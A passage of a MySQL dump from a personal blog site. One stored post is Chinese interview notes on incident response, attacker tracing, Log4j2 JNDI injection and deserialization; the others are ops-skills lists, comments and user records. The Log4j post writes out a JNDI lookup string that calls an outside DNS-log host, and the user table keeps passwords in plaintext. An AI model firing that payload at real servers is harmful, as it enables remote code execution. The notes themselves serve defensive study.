正规流程：\n1.断网：防止进一步操作\n2.取证：分析登录日志、服务日志看有哪些操作\n3.备份：备份服务器文件，主要看它的修改时间和创建时间，对比文件前后的变化\n4.查漏：寻找业务薄弱点，修补漏洞\n5.杀毒：清除后门、webshell、管理账号等\n6.溯源：摸清黑客IP地址，入侵手段等\n7.记录：归档、预防\n\n---\n\n# 溯源怎么做？\n1.其实就是渗透的反向过程\n\n2.攻击ip的定位，高精度ip定位网站去查，ID追踪手段，社工库匹配，威胁情报库匹配，看他留下的痕迹，有手机号，邮箱的话，就去查它相关的注册信息\n\n3.查看有没有恶意程序：比如说pdf、doc、exe等，使用恶意程序分析网站，比如微步在线等去查\n\n4.业务功能的有没有留下痕迹，定位到ip，看它近期的操作等\n\n---\n\n# Apache log4j2漏洞了解吗？\n1.就是存在JNDI注入漏洞嘛，当程序将用户输入的日志被记录时，即可触发此漏洞，${jndi:ladp://z2xcu7.dnslog.cn/exp}，成功利用此漏洞可以在目标服务器上执行任意远程代码。\n\n2.可以利用DNSlog生成临时域名查看测试是否有效。\n\n---\n\n# 反序列化了解吗？\n1.就是字符串转化为对象的过程。对与php来说，就是那两个函数的，serialize、unserralize，处理对象、魔术函数的时候导致，当他的参数可控时，用户精心构造的payload就会触发里边的魔术方法，造成危害。\n\n2.java的话就找ObjectInputStrem.readObject()这个方法，检测readObject()方法调用时判断其对象是否为java.io.ObjectOutputStream。如果此时ObjectInputStream对象的初始化参数来自外部请求输入参数则基本可以确定存在反序列化漏洞了。黑盒测试的话就调用ysoserial并依次生成各个第三方库利用payload，该payload构造为访问特定url链接，根据http访问请求记录判断反序列化是否成功利用。\n  ',0,1,9,'2022-09-21 22:45:37',1,0,2),(13,'高级运维需要掌握哪些技术','# 一、Linux 基础部分\n\n1、基础理论知识\n2、基础命令（系统命令、目录管理、用户管理、文件权限、磁盘管理、资源查看等等常见操作）\n3、文本高效处理（vi、vim、awk、grep、find、sed等）\n4、bash shell脚本（可以边工作边学习,使用shell编写简单的代替重复性操作的脚本）\n5. 进程调度，内存管理，文件系统，外设管理等，要熟练使用相关工具，如top iotop iftop iostat vmstat ss等，并且最好了解其原理\n![](https://img-blog.csdnimg.cn/43a4a9d2ed51430ca82287e1a87a8978.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LqS6IGU572R6ICB6L6b,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n# 二、网络管理、进程管理\n\n1、TCP/IP协议、DNS服务、CDN原理、iproute常见的网络客户端工具（ping、wget、ftp）\n2、crontab计划任务\n3、ps、top、htop、vmstat、lsof等命令\n4、tcp，http，https，udp等\n5、最好能做到精通，4层，7层的网络流量分析技能要熟练掌握。\n6、内部路由协议，边际路由，交换原理，域名解析，ipv6相关知识\n\n# 三. 数据库部分\n\n1、MySQL各个版本之间的关系和特性\n2、MySQL的安装及增删改查\n3、MySQL的存储引擎\n4、MySQL的优化\n5、MySQL日常使用及运维，包含备份及故障排查\n\n# 四. 常用开源组件\n1、LAMP和LNMP的架构\n2、tomcat的使用及优化\n3、nginx的使用场景及优化\n4、apache的使用场景及优化\n5、其他服务： dhcp,nfs,rsync,dns,等等\n\n>一句话概括：\n>mysql，redis，kafka，etcd，zk，promethues，zabbix，graphana，ansible…\n\n# 五. shell脚本\n1、使用shell脚本实现各种服务的自动化部署\n2、使用shell脚本实现监控系统及应用自动化\n3、使用shell脚本实现各类巡检，故障排查自动化\n\n# 六. 容器化和虚拟化技术\n\n1、docker ，k8s，openstack， kvm，vmware的使用\n2、容器编排的技术\n\n# 七. devops 编译，加速，测试环境，研发自动化\n![](https://img-blog.csdnimg.cn/d7b1390ca7474fd080f1e7fed87f6704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LqS6IGU572R6ICB6L6b,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n# 总结\n\n运维的核心是： 确保公司的业务的稳定运行\n\n所以服务器只是个载体，你学习的各项服务只是为了实现公司业务稳定运行服务的。',0,0,1,'2022-09-21 22:49:34',1,0,3);
/*!40000 ALTER TABLE `blog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_tag`
--

DROP TABLE IF EXISTS `blog_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `blog_tag` (
  `blog_id` int DEFAULT NULL,
  `tag_id` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_tag`
--

LOCK TABLES `blog_tag` WRITE;
/*!40000 ALTER TABLE `blog_tag` DISABLE KEYS */;
INSERT INTO `blog_tag` VALUES (1,1),(1,9),(2,6),(3,2),(3,9),(4,11),(5,3),(6,4),(6,14),(7,8),(8,14),(8,9),(9,10),(10,12),(11,13),(12,16),(13,15);
/*!40000 ALTER TABLE `blog_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `code`
--

DROP TABLE IF EXISTS `code`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `code` (
  `code_id` varchar(32) NOT NULL,
  `code_state` int DEFAULT NULL,
  `user_id` int DEFAULT NULL,
  `user_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`code_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `code`
--

LOCK TABLES `code` WRITE;
/*!40000 ALTER TABLE `code` DISABLE KEYS */;
/*!40000 ALTER TABLE `code` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `discuss`
--

DROP TABLE IF EXISTS `discuss`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `discuss` (
  `discuss_id` int NOT NULL AUTO_INCREMENT,
  `discuss_body` varchar(255) DEFAULT NULL,
  `discuss_time` datetime DEFAULT NULL,
  `user_id` int DEFAULT NULL,
  `blog_id` int DEFAULT NULL,
  PRIMARY KEY (`discuss_id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `discuss`
--

LOCK TABLES `discuss` WRITE;
/*!40000 ALTER TABLE `discuss` DISABLE KEYS */;
INSERT INTO `discuss` VALUES (2,'模板全部具体化和直接写函数有什么区别？','2022-09-17 00:02:46',0,3),(3,'很详细，感谢分享！','2022-09-22 00:17:51',3,7),(4,'买卖股票的最佳时机，从I做到IV，这是想让我成为股票大师的节奏吗？','2022-09-22 00:20:15',2,9),(5,'线程组和线程池有啥区别？','2022-09-22 00:21:08',2,1),(7,'测试测试测试测试','2022-09-22 00:33:53',1,1),(8,'111','2023-03-03 20:17:41',0,3);
/*!40000 ALTER TABLE `discuss` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `favor`
--

DROP TABLE IF EXISTS `favor`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `favor` (
  `favor_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `blog_id` int DEFAULT NULL,
  `blog_title` varchar(255) DEFAULT NULL,
  `blog_time` datetime DEFAULT NULL,
  PRIMARY KEY (`favor_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `favor`
--

LOCK TABLES `favor` WRITE;
/*!40000 ALTER TABLE `favor` DISABLE KEYS */;
INSERT INTO `favor` VALUES (2,3,1,NULL,NULL),(3,3,12,NULL,NULL),(4,3,7,NULL,NULL),(5,2,9,NULL,NULL),(7,2,1,NULL,NULL),(8,0,1,NULL,NULL),(9,1,1,NULL,NULL),(10,0,8,NULL,NULL),(11,0,3,NULL,NULL);
/*!40000 ALTER TABLE `favor` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `follow`
--

DROP TABLE IF EXISTS `follow`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `follow` (
  `follow_time` datetime DEFAULT NULL,
  `follow_followingId` int DEFAULT NULL,
  `follow_followerId` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `follow`
--

LOCK TABLES `follow` WRITE;
/*!40000 ALTER TABLE `follow` DISABLE KEYS */;
INSERT INTO `follow` VALUES ('2022-09-22 00:07:18',2,3),('2022-09-22 00:15:35',0,3),('2022-09-20 00:15:45',1,3),('2022-09-14 02:15:56',1,2),('2022-09-22 02:16:10',0,2),('2022-09-22 00:16:32',0,1),('2023-03-03 20:17:38',1,0);
/*!40000 ALTER TABLE `follow` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `login` (
  `login_time` datetime DEFAULT NULL,
  `login_ip` varchar(16) DEFAULT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES ('2023-03-03 20:15:15','127.0.0.1',0),('2022-09-22 00:32:21','127.0.0.1',1),('2022-09-22 00:18:30','127.0.0.1',2),('2022-09-22 00:12:46','127.0.0.1',3);
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `message`
--

DROP TABLE IF EXISTS `message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `message` (
  `message_id` int NOT NULL AUTO_INCREMENT,
  `message_name` varchar(30) DEFAULT NULL,
  `message_body` varchar(255) DEFAULT NULL,
  `message_time` datetime DEFAULT NULL,
  PRIMARY KEY (`message_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `message`
--

LOCK TABLES `message` WRITE;
/*!40000 ALTER TABLE `message` DISABLE KEYS */;
INSERT INTO `message` VALUES (1,'root','2022年9月15日 基金血亏','2022-09-16 20:55:15'),(2,'127.0.0.1','锟斤拷烫烫烫烫烫烫烫烫烫','2022-09-22 00:38:38'),(3,'root','1111','2023-03-03 20:17:52');
/*!40000 ALTER TABLE `message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reply`
--

DROP TABLE IF EXISTS `reply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `reply` (
  `reply_id` int NOT NULL AUTO_INCREMENT,
  `reply_body` varchar(255) DEFAULT NULL,
  `reply_time` datetime DEFAULT NULL,
  `user_id` int DEFAULT NULL,
  `discuss_id` int DEFAULT NULL,
  `reply_rootid` int DEFAULT NULL,
  PRIMARY KEY (`reply_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reply`
--

LOCK TABLES `reply` WRITE;
/*!40000 ALTER TABLE `reply` DISABLE KEYS */;
INSERT INTO `reply` VALUES (2,'文中有提到哦~','2022-09-22 00:26:33',0,5,NULL),(3,'具体化时，可以针对某具体类型 与原先的模板做不同的功能实现。','2022-09-22 00:33:17',1,2,NULL);
/*!40000 ALTER TABLE `reply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `role`
--

DROP TABLE IF EXISTS `role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `role` (
  `role_id` int NOT NULL AUTO_INCREMENT,
  `role_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`role_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `role`
--

LOCK TABLES `role` WRITE;
/*!40000 ALTER TABLE `role` DISABLE KEYS */;
INSERT INTO `role` VALUES (0,'ADMIN'),(1,'USER');
/*!40000 ALTER TABLE `role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_files`
--

DROP TABLE IF EXISTS `t_files`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_files` (
  `id` int NOT NULL AUTO_INCREMENT,
  `Name` varchar(255) DEFAULT NULL,
  `path` varchar(255) DEFAULT NULL,
  `size` varchar(255) DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  `uploadTime` datetime DEFAULT NULL,
  `userId` int DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_files`
--

LOCK TABLES `t_files` WRITE;
/*!40000 ALTER TABLE `t_files` DISABLE KEYS */;
INSERT INTO `t_files` VALUES (1,'2.jpeg','/home/yveltal/avatar/file/Zekrom/2.jpeg','1.3 kb','jpeg','2022-09-18 00:32:00',2),(2,'算法导论中文版.pdf','/home/yveltal/avatar/file/root/算法导论中文版.pdf','50.57 Mb','pdf','2022-09-22 00:36:07',0),(4,'C++14标准.pdf','/home/yveltal/avatar/file/root/C++14标准.pdf','414.4 kb','pdf','2022-09-22 00:36:47',0),(5,'C++內存管理示例.cpp','/home/yveltal/avatar/file/root/C++內存管理示例.cpp','94.0 kb','cpp','2022-09-22 00:37:34',0);
/*!40000 ALTER TABLE `t_files` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tag`
--

DROP TABLE IF EXISTS `tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `tag` (
  `tag_id` int NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`tag_id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tag`
--

LOCK TABLES `tag` WRITE;
/*!40000 ALTER TABLE `tag` DISABLE KEYS */;
INSERT INTO `tag` VALUES (1,'java'),(2,'c++'),(3,'docker'),(4,'前端'),(6,'AI'),(8,'嵌入式'),(9,'后端'),(10,'数据结构与算法'),(11,'音视频'),(12,'数据库'),(13,'操作系统'),(14,'软件工程'),(15,'运维'),(16,'网络安全');
/*!40000 ALTER TABLE `tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user` (
  `user_id` int NOT NULL AUTO_INCREMENT,
  `user_name` varchar(30) DEFAULT NULL,
  `user_password` varchar(255) DEFAULT NULL,
  `user_mail` varchar(255) DEFAULT NULL,
  `user_gender` varchar(30) DEFAULT NULL,
  `user_birth` date DEFAULT NULL,
  `user_job` varchar(255) DEFAULT NULL,
  `user_qq` varchar(255) DEFAULT NULL,
  `user_summary` varchar(255) DEFAULT NULL,
  `user_avatar` varchar(255) DEFAULT NULL,
  `user_state` int DEFAULT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (0,'root','root','admin@qq.com','男','2000-07-24','学生','','系统管理员','http://127.0.0.1:8080/root.jpeg',1),(1,'Yveltals','111111','1302540061@qq.com','男','2000-07-24','学生','1302540061@qq.com','这个人很懒，还没有简介','http://127.0.0.1:8080/Yveltals.jpg',1),(2,'雨落听风','111111','3481146533@qq.com','女','2000-04-27','','2096588366','到了应该为梦想努力的年纪','http://127.0.0.1:8080/雨落听风.jpeg',1),(3,'AlbertE','111111','15301124587@163.com','男','2000-07-15',NULL,NULL,'菜鸡*1','http://127.0.0.1:8080/AlbertE.jpg',1);
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_role`
--

DROP TABLE IF EXISTS `user_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_role` (
  `user_role_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `role_id` int DEFAULT NULL,
  PRIMARY KEY (`user_role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_role`
--

LOCK TABLES `user_role` WRITE;
/*!40000 ALTER TABLE `user_role` DISABLE KEYS */;
INSERT INTO `user_role` VALUES (0,0,0),(1,1,1),(2,2,1),(3,3,1),(4,0,1);
/*!40000 ALTER TABLE `user_role` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-03-04 22:48:02
